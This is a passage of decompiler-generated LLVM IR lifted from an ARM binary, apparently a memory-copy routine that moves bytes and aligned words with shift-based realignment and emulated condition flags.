  %v5_110ac = icmp slt i32 %v4_110ac, 0
  store i1 %v5_110ac, i1* %cpsr_v.global-to-local, align 1
  %v6_110ac = icmp slt i32 %v1_110ac, 0
  store i1 %v6_110ac, i1* %cpsr_n.global-to-local, align 1
  %v7_110ac = icmp eq i32 %v1_110ac, 0
  store i1 %v7_110ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110ac, label %bb, label %._crit_edge

._crit_edge:                                      ; preds = %.backedge
  br label %bb17

bb:                                               ; preds = %.backedge
  %v1_110b0 = load i32, i32* @sp, align 4
  %v2_110b0 = inttoptr i32 %v1_110b0 to i32*
  %v3_110b0 = load i32, i32* %v2_110b0, align 4
  store i32 %v3_110b0, i32* @r0, align 4
  %v4_110b0 = add i32 %v1_110b0, 4
  %v5_110b0 = inttoptr i32 %v4_110b0 to i32*
  br label %bb17

bb17:                                             ; preds = %._crit_edge, %bb
  %v0_110b4.in = phi i32* [ @r3, %._crit_edge ], [ %v5_110b0, %bb ]
  %v0_110b4 = load i32, i32* %v0_110b4.in, align 4
  call void @__pseudo_cond_branch(i1 %v7_110ac, i32 %v0_110b4)
  %v0_110b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_110b8 = add i32 %v0_110b8, -2
  %v3_110b8 = sub i32 1, %v0_110b8
  %v4_110b8 = and i32 %v3_110b8, %v0_110b8
  %v5_110b8 = icmp slt i32 %v4_110b8, 0
  store i1 %v5_110b8, i1* %cpsr_v.global-to-local, align 1
  %v6_110b8 = icmp slt i32 %v1_110b8, 0
  store i1 %v6_110b8, i1* %cpsr_n.global-to-local, align 1
  %v7_110b8 = icmp eq i32 %v0_110b8, 2
  store i1 %v7_110b8, i1* %cpsr_z.global-to-local, align 1
  %v0_110bc = load i32, i32* @r1, align 4
  %v1_110bc = inttoptr i32 %v0_110bc to i8*
  %v2_110bc = load i8, i8* %v1_110bc, align 1
  %v5_110bc = add i32 %v0_110bc, 1
  store i32 %v5_110bc, i32* %r1.global-to-local, align 4
  %v2_110c0 = load i32, i32* @r0, align 4
  %v3_110c0 = inttoptr i32 %v2_110c0 to i8*
  store i8 %v2_110bc, i8* %v3_110c0, align 1
  %v4_110c0 = load i32, i32* @r0, align 4
  %v5_110c0 = add i32 %v4_110c0, 1
  store i32 %v5_110c0, i32* %r0.global-to-local, align 4
  %v0_110c4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_110c4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_110c4 = xor i1 %v0_110c4, %v1_110c4
  br i1 %v2_110c4, label %.thread, label %bb18

bb18:                                             ; preds = %bb17
  %v3_110c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_110c4 = inttoptr i32 %v3_110c4 to i8*
  %v5_110c4 = load i8, i8* %v4_110c4, align 1
  %v8_110c4 = add i32 %v3_110c4, 1
  store i32 %v8_110c4, i32* %r1.global-to-local, align 4
  %v6_110c8 = inttoptr i32 %v5_110c0 to i8*
  store i8 %v5_110c4, i8* %v6_110c8, align 1
  %v7_110c8 = load i32, i32* %r0.global-to-local, align 4
  %v8_110c8 = add i32 %v7_110c8, 1
  store i32 %v8_110c8, i32* %r0.global-to-local, align 4
  %v1_110cc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_110cc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread

.thread:                                          ; preds = %bb17, %bb18
  %v7_110d0 = phi i32 [ %v8_110c8, %bb18 ], [ %v5_110c0, %bb17 ]
  %v2_110d0 = phi i1 [ %v2_110cc.pre, %bb18 ], [ %v1_110c4, %bb17 ]
  %v1_110d0 = phi i1 [ %v1_110cc.pre, %bb18 ], [ %v0_110c4, %bb17 ]
  %v0_110cc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_110cc = xor i1 %v2_110d0, %v1_110d0
  %v4_110cc = or i1 %v0_110cc, %v3_110cc
  br i1 %v4_110cc, label %.thread14, label %bb19

bb19:                                             ; preds = %.thread
  %v5_110cc = load i32, i32* %r1.global-to-local, align 4
  %v6_110cc = inttoptr i32 %v5_110cc to i8*
  %v7_110cc = load i8, i8* %v6_110cc, align 1
  %v10_110cc = add i32 %v5_110cc, 1
  store i32 %v10_110cc, i32* %r1.global-to-local, align 4
  %v8_110d0 = inttoptr i32 %v7_110d0 to i8*
  store i8 %v7_110cc, i8* %v8_110d0, align 1
  %v9_110d0 = load i32, i32* %r0.global-to-local, align 4
  %v10_110d0 = add i32 %v9_110d0, 1
  store i32 %v10_110d0, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %.thread, %bb19
  %v0_110d4 = load i32, i32* @sp, align 4
  %v1_110d4 = inttoptr i32 %v0_110d4 to i32*
  %v2_110d4 = load i32, i32* %v1_110d4, align 4
  store i32 %v2_110d4, i32* %r0.global-to-local, align 4
  %v3_110d4 = add i32 %v0_110d4, 4
  %v4_110d4 = inttoptr i32 %v3_110d4 to i32*
  %v5_110d4 = load i32, i32* %v4_110d4, align 4
  call void @__pseudo_branch(i32 %v5_110d4)
  %v0_110dc = load i32, i32* @ip, align 4
  %v1_110dc = sub i32 4, %v0_110dc
  store i32 %v1_110dc, i32* @ip, align 4
  %v1_110e0 = add i32 %v1_110dc, -2
  %v3_110e0 = sub i32 1, %v1_110dc
  %v4_110e0 = and i32 %v3_110e0, %v1_110dc
  %v5_110e0 = icmp slt i32 %v4_110e0, 0
  store i1 %v5_110e0, i1* %cpsr_v.global-to-local, align 1
  %v6_110e0 = icmp slt i32 %v1_110e0, 0
  store i1 %v6_110e0, i1* %cpsr_n.global-to-local, align 1
  %v7_110e0 = icmp eq i32 %v1_110dc, 2
  store i1 %v7_110e0, i1* %cpsr_z.global-to-local, align 1
  %v0_110e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_110e4 = inttoptr i32 %v0_110e4 to i8*
  %v2_110e4 = load i8, i8* %v1_110e4, align 1
  %v3_110e4 = zext i8 %v2_110e4 to i32
  store i32 %v3_110e4, i32* @r3, align 4
  %v5_110e4 = add i32 %v0_110e4, 1
  store i32 %v5_110e4, i32* @r1, align 4
  %v2_110e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_110e8 = inttoptr i32 %v2_110e8 to i8*
  store i8 %v2_110e4, i8* %v3_110e8, align 1
  %v4_110e8 = load i32, i32* %r0.global-to-local, align 4
  %v5_110e8 = add i32 %v4_110e8, 1
  store i32 %v5_110e8, i32* @r0, align 4
  %v0_110ec = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_110ec = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_110ec = xor i1 %v0_110ec, %v1_110ec
  br i1 %v2_110ec, label %.thread15, label %bb20

bb20:                                             ; preds = %.thread14
  %v3_110ec = load i32, i32* @r1, align 4
  %v4_110ec = inttoptr i32 %v3_110ec to i8*
  %v5_110ec = load i8, i8* %v4_110ec, align 1
  %v6_110ec = zext i8 %v5_110ec to i32
  store i32 %v6_110ec, i32* @r3, align 4
  %v8_110ec = add i32 %v3_110ec, 1
  store i32 %v8_110ec, i32* @r1, align 4
  %v6_110f0 = inttoptr i32 %v5_110e8 to i8*
  store i8 %v5_110ec, i8* %v6_110f0, align 1
  %v7_110f0 = load i32, i32* @r0, align 4
  %v8_110f0 = add i32 %v7_110f0, 1
  store i32 %v8_110f0, i32* @r0, align 4
  %v1_110f4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_110f4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread15

.thread15:                                        ; preds = %.thread14, %bb20
  %v7_110f8 = phi i32 [ %v8_110f0, %bb20 ], [ %v5_110e8, %.thread14 ]
  %v2_110f8 = phi i1 [ %v2_110f4.pre, %bb20 ], [ %v1_110ec, %.thread14 ]
  %v1_110f8 = phi i1 [ %v1_110f4.pre, %bb20 ], [ %v0_110ec, %.thread14 ]
  %v0_110f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_110f4 = xor i1 %v2_110f8, %v1_110f8
  %v4_110f4 = or i1 %v0_110f4, %v3_110f4
  br i1 %v4_110f4, label %.thread16, label %bb21

bb21:                                             ; preds = %.thread15
  %v5_110f4 = load i32, i32* @r1, align 4
  %v6_110f4 = inttoptr i32 %v5_110f4 to i8*
  %v7_110f4 = load i8, i8* %v6_110f4, align 1
  %v8_110f4 = zext i8 %v7_110f4 to i32
  store i32 %v8_110f4, i32* @r3, align 4
  %v10_110f4 = add i32 %v5_110f4, 1
  store i32 %v10_110f4, i32* @r1, align 4
  %v8_110f8 = inttoptr i32 %v7_110f8 to i8*
  store i8 %v7_110f4, i8* %v8_110f8, align 1
  %v9_110f8 = load i32, i32* @r0, align 4
  %v10_110f8 = add i32 %v9_110f8, 1
  store i32 %v10_110f8, i32* @r0, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread15, %bb21
  %v0_110fc = load i32, i32* %r2.global-to-local, align 4
  %v1_110fc = load i32, i32* @ip, align 4
  %v2_110fc = sub i32 %v0_110fc, %v1_110fc
  store i32 %v2_110fc, i32* %r2.global-to-local, align 4
  %v4_110fc = xor i32 %v1_110fc, %v0_110fc
  %v5_110fc = xor i32 %v2_110fc, %v0_110fc
  %v6_110fc = and i32 %v5_110fc, %v4_110fc
  %v7_110fc = icmp slt i32 %v6_110fc, 0
  store i1 %v7_110fc, i1* %cpsr_v.global-to-local, align 1
  %v8_110fc = icmp slt i32 %v2_110fc, 0
  store i1 %v8_110fc, i1* %cpsr_n.global-to-local, align 1
  %v9_110fc = icmp eq i32 %v0_110fc, %v1_110fc
  store i1 %v9_110fc, i1* %cpsr_z.global-to-local, align 1
  %v2_11100 = xor i1 %v8_110fc, %v7_110fc
  br i1 %v2_11100, label %.backedge, label %dec_label_pc_11104

dec_label_pc_11104:                               ; preds = %.thread16
  %v0_11104 = load i32, i32* @r1, align 4
  %v1_11104 = urem i32 %v0_11104, 4
  store i32 %v1_11104, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11104 = icmp eq i32 %v1_11104, 0
  store i1 %v2_11104, i1* %cpsr_z.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v2_11104, i32 ptrtoint (i32* @global_var_11038.496 to i32))
  %v0_1110c = load i32, i32* @r1, align 4
  %v1_1110c = and i32 %v0_1110c, -4
  store i32 %v1_1110c, i32* %r1.global-to-local, align 4
  %v1_11110 = inttoptr i32 %v1_1110c to i32*
  %v2_11110 = load i32, i32* %v1_11110, align 4
  store i32 %v2_11110, i32* @lr, align 4
  %v4_11110 = add i32 %v1_1110c, 4
  store i32 %v4_11110, i32* @r1, align 4
  %v0_11114 = load i32, i32* %ip.global-to-local, align 4
  %v1_11114 = add i32 %v0_11114, -2
  %v3_11114 = sub i32 1, %v0_11114
  %v4_11114 = and i32 %v3_11114, %v0_11114
  %v5_11114 = icmp slt i32 %v4_11114, 0
  store i1 %v5_11114, i1* %cpsr_v.global-to-local, align 1
  %v6_11114 = icmp slt i32 %v1_11114, 0
  store i1 %v6_11114, i1* %cpsr_n.global-to-local, align 1
  %v7_11114 = icmp eq i32 %v0_11114, 2
  store i1 %v7_11114, i1* %cpsr_z.global-to-local, align 1
  %v3_11118 = xor i1 %v6_11114, %v5_11114
  %v4_11118 = or i1 %v7_11114, %v3_11118
  %v5_11118 = xor i1 %v4_11118, true
  call void @__pseudo_cond_branch(i1 %v5_11118, i32 ptrtoint (i32* @global_var_111f8.497 to i32))
  %v0_1118c = load i32, i32* %r2.global-to-local, align 4
  %v1_1118c = add i32 %v0_1118c, -12
  %v3_1118c = sub i32 11, %v0_1118c
  %v4_1118c = and i32 %v3_1118c, %v0_1118c
  %v5_1118c = icmp slt i32 %v4_1118c, 0
  store i1 %v5_1118c, i1* %cpsr_v.global-to-local, align 1
  %v6_1118c = icmp slt i32 %v1_1118c, 0
  store i1 %v6_1118c, i1* %cpsr_n.global-to-local, align 1
  %v7_1118c = icmp eq i32 %v0_1118c, 12
  store i1 %v7_1118c, i1* %cpsr_z.global-to-local, align 1
  %v2_11190 = xor i1 %v6_1118c, %v5_1118c
  br i1 %v7_11114, label %dec_label_pc_1118c, label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %dec_label_pc_11104
  br i1 %v2_11190, label %dec_label_pc_11120.dec_label_pc_1116c.preheader_crit_edge, label %dec_label_pc_11128

dec_label_pc_11120.dec_label_pc_1116c.preheader_crit_edge: ; preds = %dec_label_pc_11120
  %v1_11178.pre.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1116c

dec_label_pc_11128:                               ; preds = %dec_label_pc_11120
  store i32 %v1_1118c, i32* %r2.global-to-local, align 4
  %v0_1112c = load i32, i32* @sp, align 4
  %v1_1112c = add i32 %v0_1112c, -8
  %v2_1112c = inttoptr i32 %v1_1112c to i32*
  %v3_1112c = load i32, i32* @r4, align 4
  store i32 %v3_1112c, i32* %v2_1112c, align 4
  %v4_1112c = add i32 %v0_1112c, -4
  %v5_1112c = inttoptr i32 %v4_1112c to i32*
  %v6_1112c = load i32, i32* @r5, align 4
  store i32 %v6_1112c, i32* %v5_1112c, align 4
  %v0_11154.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_11130, %dec_label_pc_11128
  %v0_11154 = phi i32 [ %v12_11154, %dec_label_pc_11130 ], [ %v0_11154.pre, %dec_label_pc_11128 ]
  %v0_11130 = load i32, i32* @lr, align 4
  %v3_11130 = udiv i32 %v0_11130, 256
  %v0_11134 = load i32, i32* @r1, align 4
  %v1_11134 = inttoptr i32 %v0_11134 to i32*
  %v2_11134 = load i32, i32* %v1_11134, align 4
  store i32 %v2_11134, i32* %r4.global-to-local, align 4
  %v3_11134 = add i32 %v0_11134, 4
  %v4_11134 = inttoptr i32 %v3_11134 to i32*
  %v5_11134 = load i32, i32* %v4_11134, align 4
  store i32 %v5_11134, i32* %r5.global-to-local, align 4
  %v6_11134 = add i32 %v0_11134, 8
  %v7_11134 = inttoptr i32 %v6_11134 to i32*
  %v8_11134 = load i32, i32* %v7_11134, align 4
  store i32 %v8_11134, i32* %ip.global-to-local, align 4
  %v9_11134 = add i32 %v0_11134, 12
  %v10_11134 = inttoptr i32 %v9_11134 to i32*
  %v11_11134 = load i32, i32* %v10_11134, align 4
  store i32 %v11_11134, i32* @lr, align 4
  %v12_11134 = add i32 %v0_11134, 16
  store i32 %v12_11134, i32* @r1, align 4
  %v4_11138 = mul i32 %v2_11134, 16777216
  %v5_11138 = or i32 %v4_11138, %v3_11130
  store i32 %v5_11138, i32* @r3, align 4
  %v3_1113c = udiv i32 %v2_11134, 256
  %v4_11140 = mul i32 %v5_11134, 16777216
  %v5_11140 = or i32 %v4_11140, %v3_1113c
  store i32 %v5_11140, i32* %r4.global-to-local, align 4
  %v3_11144 = udiv i32 %v5_11134, 256
  %v4_11148 = mul i32 %v8_11134, 16777216
  %v5_11148 = or i32 %v4_11148, %v3_11144
  store i32 %v5_11148, i32* %r5.global-to-local, align 4
  %v3_1114c = udiv i32 %v8_11134, 256
  %v4_11150 = mul i32 %v11_11134, 16777216
  %v5_11150 = or i32 %v4_11150, %v3_1114c
  store i32 %v5_11150, i32* @ip, align 4
  %v1_11154 = inttoptr i32 %v0_11154 to i32*
  store i32 %v5_11138, i32* %v1_11154, align 4
  %v3_11154 = add i32 %v0_11154, 4
  %v4_11154 = inttoptr i32 %v3_11154 to i32*
  %v5_11154 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11154, i32* %v4_11154, align 4
  %v6_11154 = add i32 %v0_11154, 8
  %v7_11154 = inttoptr i32 %v6_11154 to i32*
  %v8_11154 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_11154, i32* %v7_11154, align 4
  %v9_11154 = add i32 %v0_11154, 12
  %v10_11154 = inttoptr i32 %v9_11154 to i32*
  %v11_11154 = load i32, i32* @ip, align 4
  store i32 %v11_11154, i32* %v10_11154, align 4
  %v12_11154 = add i32 %v0_11154, 16
  store i32 %v12_11154, i32* @r0, align 4
  %v0_11158 = load i32, i32* %r2.global-to-local, align 4
  %v1_11158 = add i32 %v0_11158, -16
  store i32 %v1_11158, i32* %r2.global-to-local, align 4
  %v3_11158 = sub i32 15, %v0_11158
  %v4_11158 = and i32 %v3_11158, %v0_11158
  %v5_11158 = icmp slt i32 %v4_11158, 0
  %v6_11158 = icmp slt i32 %v1_11158, 0
  %v2_1115c = xor i1 %v6_11158, %v5_11158
  br i1 %v2_1115c, label %dec_label_pc_11160, label %dec_label_pc_11130

dec_label_pc_11160:                               ; preds = %dec_label_pc_11130
  %v0_11160 = load i32, i32* @sp, align 4
  %v1_11160 = inttoptr i32 %v0_11160 to i32*
  %v2_11160 = load i32, i32* %v1_11160, align 4
  store i32 %v2_11160, i32* @r4, align 4
  %v3_11160 = add i32 %v0_11160, 4
  %v4_11160 = inttoptr i32 %v3_11160 to i32*
  %v5_11160 = load i32, i32* %v4_11160, align 4
  store i32 %v5_11160, i32* @r5, align 4
  %v1_11164 = add i32 %v0_11158, -4
  store i32 %v1_11164, i32* %r2.global-to-local, align 4
  %v3_11164 = add i32 %v0_11158, 2147483632
  %v4_11164 = and i32 %v1_11164, %v3_11164
  %v5_11164 = icmp slt i32 %v4_11164, 0
  store i1 %v5_11164, i1* %cpsr_v.global-to-local, align 1
  %v6_11164 = icmp slt i32 %v1_11164, 0
  store i1 %v6_11164, i1* %cpsr_n.global-to-local, align 1
  %v7_11164 = icmp eq i32 %v1_11164, 0
  store i1 %v7_11164, i1* %cpsr_z.global-to-local, align 1
  %v2_11168 = xor i1 %v6_11164, %v5_11164
  br i1 %v2_11168, label %dec_label_pc_11184, label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_11160, %dec_label_pc_11120.dec_label_pc_1116c.preheader_crit_edge, %dec_label_pc_1116c
  %v1_11178 = phi i32 [ %v4_11178, %dec_label_pc_1116c ], [ %v12_11154, %dec_label_pc_11160 ], [ %v1_11178.pre.pre, %dec_label_pc_11120.dec_label_pc_1116c.preheader_crit_edge ]
  %v0_1116c = load i32, i32* @lr, align 4
  %v3_1116c = udiv i32 %v0_1116c, 256
  store i32 %v3_1116c, i32* %ip.global-to-local, align 4
  %v0_11170 = load i32, i32* @r1, align 4
  %v1_11170 = inttoptr i32 %v0_11170 to i32*
  %v2_11170 = load i32, i32* %v1_11170, align 4
  store i32 %v2_11170, i32* @lr, align 4
  %v4_11170 = add i32 %v0_11170, 4
  store i32 %v4_11170, i32* @r1, align 4
  %v4_11174 = mul i32 %v2_11170, 16777216
  %v5_11174 = or i32 %v4_11174, %v3_1116c
  store i32 %v5_11174, i32* @ip, align 4
  %v2_11178 = inttoptr i32 %v1_11178 to i32*
  store i32 %v5_11174, i32* %v2_11178, align 4
  %v3_11178 = load i32, i32* @r0, align 4
  %v4_11178 = add i32 %v3_11178, 4
  store i32 %v4_11178, i32* @r0, align 4
  %v0_1117c = load i32, i32* %r2.global-to-local, align 4
  %v1_1117c = add i32 %v0_1117c, -4
  store i32 %v1_1117c, i32* %r2.global-to-local, align 4
  %v3_1117c = sub i32 3, %v0_1117c
  %v4_1117c = and i32 %v3_1117c, %v0_1117c
  %v5_1117c = icmp slt i32 %v4_1117c, 0
  %v6_1117c = icmp slt i32 %v1_1117c, 0
  %v2_11180 = xor i1 %v6_1117c, %v5_1117c
  br i1 %v2_11180, label %dec_label_pc_11184.loopexit, label %dec_label_pc_1116c

dec_label_pc_11184.loopexit:                      ; preds = %dec_label_pc_1116c
  %v7_1117c = icmp eq i32 %v0_1117c, 4
  store i1 %v5_1117c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1117c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1117c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %dec_label_pc_11184.loopexit, %dec_label_pc_11160
  %v0_110ac3 = phi i32 [ %v1_1117c, %dec_label_pc_11184.loopexit ], [ %v1_11164, %dec_label_pc_11160 ]
  %v0_11184 = load i32, i32* @r1, align 4
  %v1_11184 = add i32 %v0_11184, -3
  store i32 %v1_11184, i32* @r1, align 4
  br label %.backedge

dec_label_pc_1118c:                               ; preds = %dec_label_pc_11104
  call void @__pseudo_cond_branch(i1 %v2_11190, i32 ptrtoint (i32* @global_var_111d8.498 to i32))
  %v0_11194 = load i32, i32* %r2.global-to-local, align 4
  %v1_11194 = add i32 %v0_11194, -12
  store i32 %v1_11194, i32* @r2, align 4
  %v2_11194 = load i32, i32* @r0, align 4
  ret i32 %v2_11194

; uselistorder directives
  uselistorder i32 %v1_1117c, { 0, 2, 1 }
  uselistorder i32 %v4_11178, { 1, 0 }
  uselistorder i32 %v3_1116c, { 1, 0 }
  uselistorder i32 %v1_11164, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_11158, { 1, 0 }
  uselistorder i32 %v12_11154, { 0, 2, 1 }
  uselistorder i32 %v8_11134, { 1, 0, 2 }
  uselistorder i32 %v5_11134, { 1, 0, 2 }
  uselistorder i32 %v2_11134, { 1, 0, 2 }
  uselistorder i32 %v0_11154, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1118c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_11114, { 3, 0, 1, 2 }
  uselistorder i32 %v1_11104, { 1, 0 }
  uselistorder i32 %v2_110fc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_110fc, { 1, 0, 2 }
  uselistorder i32 %v0_110fc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_110dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_110b8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_110ac, { 1, 2, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1116c, { 2, 0, 1 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
}

define i32 @function_11198() local_unnamed_addr {
dec_label_pc_11198:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11198 = load i32, i32* @r4, align 4
  store i32 %v3_11198, i32* %stack_var_-8, align 4
  %v6_11198 = load i32, i32* @r5, align 4
  %v0_111c0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_1119c, %dec_label_pc_11198
  %v0_111c0 = phi i32 [ %v12_111c0, %dec_label_pc_1119c ], [ %v0_111c0.pre, %dec_label_pc_11198 ]
  %v0_1119c = load i32, i32* @lr, align 4
  %v3_1119c = udiv i32 %v0_1119c, 65536
  store i32 %v3_1119c, i32* %r3.global-to-local, align 4
  %v0_111a0 = load i32, i32* @r1, align 4
  %v1_111a0 = inttoptr i32 %v0_111a0 to i32*
  %v2_111a0 = load i32, i32* %v1_111a0, align 4
  store i32 %v2_111a0, i32* %r4.global-to-local, align 4
  %v3_111a0 = add i32 %v0_111a0, 4
  %v4_111a0 = inttoptr i32 %v3_111a0 to i32*
  %v5_111a0 = load i32, i32* %v4_111a0, align 4
  store i32 %v5_111a0, i32* %r5.global-to-local, align 4
  %v6_111a0 = add i32 %v0_111a0, 8
  %v7_111a0 = inttoptr i32 %v6_111a0 to i32*
  %v8_111a0 = load i32, i32* %v7_111a0, align 4
  store i32 %v8_111a0, i32* %ip.global-to-local, align 4
  %v9_111a0 = add i32 %v0_111a0, 12
  %v10_111a0 = inttoptr i32 %v9_111a0 to i32*
  %v11_111a0 = load i32, i32* %v10_111a0, align 4
  store i32 %v11_111a0, i32* @lr, align 4
  %v12_111a0 = add i32 %v0_111a0, 16
  store i32 %v12_111a0, i32* @r1, align 4
  %v4_111a4 = mul i32 %v2_111a0, 65536
  %v5_111a4 = or i32 %v4_111a4, %v3_1119c
  store i32 %v5_111a4, i32* @r3, align 4
  %v3_111a8 = udiv i32 %v2_111a0, 65536
  %v4_111ac = mul i32 %v5_111a0, 65536
  %v5_111ac = or i32 %v4_111ac, %v3_111a8
  store i32 %v5_111ac, i32* %r4.global-to-local, align 4
  %v3_111b0 = udiv i32 %v5_111a0, 65536
  %v4_111b4 = mul i32 %v8_111a0, 65536
  %v5_111b4 = or i32 %v4_111b4, %v3_111b0
  store i32 %v5_111b4, i32* %r5.global-to-local, align 4
  %v3_111b8 = udiv i32 %v8_111a0, 65536
  %v4_111bc = mul i32 %v11_111a0, 65536
  %v5_111bc = or i32 %v4_111bc, %v3_111b8
  store i32 %v5_111bc, i32* @ip, align 4
  %v1_111c0 = inttoptr i32 %v0_111c0 to i32*
  store i32 %v5_111a4, i32* %v1_111c0, align 4
  %v3_111c0 = add i32 %v0_111c0, 4
  %v4_111c0 = inttoptr i32 %v3_111c0 to i32*
  %v5_111c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_111c0, i32* %v4_111c0, align 4
  %v6_111c0 = add i32 %v0_111c0, 8
  %v7_111c0 = inttoptr i32 %v6_111c0 to i32*
  %v8_111c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_111c0, i32* %v7_111c0, align 4
  %v9_111c0 = add i32 %v0_111c0, 12
  %v10_111c0 = inttoptr i32 %v9_111c0 to i32*
  %v11_111c0 = load i32, i32* @ip, align 4
  store i32 %v11_111c0, i32* %v10_111c0, align 4
  %v12_111c0 = add i32 %v0_111c0, 16
  store i32 %v12_111c0, i32* @r0, align 4
  %v0_111c4 = load i32, i32* @r2, align 4
  %v2_111c4 = add i32 %v0_111c4, -16
  store i32 %v2_111c4, i32* @r2, align 4
  %v6_111c8 = icmp slt i32 %v0_111c4, 16
  br i1 %v6_111c8, label %dec_label_pc_111cc, label %dec_label_pc_1119c

dec_label_pc_111cc:                               ; preds = %dec_label_pc_1119c
  %v2_111cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_111cc, i32* @r4, align 4
  store i32 %v6_11198, i32* @r5, align 4
  %v2_111d0 = add i32 %v0_111c4, -4
  store i32 %v2_111d0, i32* @r2, align 4
  %v4_111d0 = add i32 %v0_111c4, 2147483632
  %v5_111d0 = and i32 %v2_111d0, %v4_111d0
  %v6_111d0 = icmp slt i32 %v5_111d0, 0
  store i1 %v6_111d0, i1* %cpsr_v.global-to-local, align 1
  %v7_111d0 = icmp slt i32 %v2_111d0, 0
  store i1 %v7_111d0, i1* %cpsr_n.global-to-local, align 1
  %v8_111d0 = icmp eq i32 %v2_111d0, 0
  store i1 %v8_111d0, i1* %cpsr_z.global-to-local, align 1
  %v5_111d4 = icmp slt i32 %v2_111c4, -12
  br i1 %v5_111d4, label %dec_label_pc_111f0, label %dec_label_pc_111d8

dec_label_pc_111d8:                               ; preds = %dec_label_pc_111cc, %dec_label_pc_111d8
  %v1_111e4 = phi i32 [ %v4_111e4, %dec_label_pc_111d8 ], [ %v12_111c0, %dec_label_pc_111cc ]
  %v0_111d8 = load i32, i32* @lr, align 4
  %v3_111d8 = udiv i32 %v0_111d8, 65536
  store i32 %v3_111d8, i32* %ip.global-to-local, align 4
  %v0_111dc = load i32, i32* @r1, align 4
  %v1_111dc = inttoptr i32 %v0_111dc to i32*
  %v2_111dc = load i32, i32* %v1_111dc, align 4
  store i32 %v2_111dc, i32* @lr, align 4
  %v4_111dc = add i32 %v0_111dc, 4
  store i32 %v4_111dc, i32* @r1, align 4
  %v4_111e0 = mul i32 %v2_111dc, 65536
  %v5_111e0 = or i32 %v4_111e0, %v3_111d8
  store i32 %v5_111e0, i32* @ip, align 4
  %v2_111e4 = inttoptr i32 %v1_111e4 to i32*
  store i32 %v5_111e0, i32* %v2_111e4, align 4
  %v3_111e4 = load i32, i32* @r0, align 4
  %v4_111e4 = add i32 %v3_111e4, 4
  store i32 %v4_111e4, i32* @r0, align 4
  %v0_111e8 = load i32, i32* @r2, align 4
  %v2_111e8 = add i32 %v0_111e8, -4
  store i32 %v2_111e8, i32* @r2, align 4
  %v6_111ec = icmp slt i32 %v0_111e8, 4
  br i1 %v6_111ec, label %dec_label_pc_111f0.loopexit, label %dec_label_pc_111d8

dec_label_pc_111f0.loopexit:                      ; preds = %dec_label_pc_111d8
  %v4_111e8 = sub i32 3, %v0_111e8
  %v5_111e8 = and i32 %v4_111e8, %v0_111e8
  %v6_111e8 = icmp slt i32 %v5_111e8, 0
  %v7_111e8 = icmp slt i32 %v2_111e8, 0
  store i1 %v6_111e8, i1* %cpsr_v.global-to-local, align 1
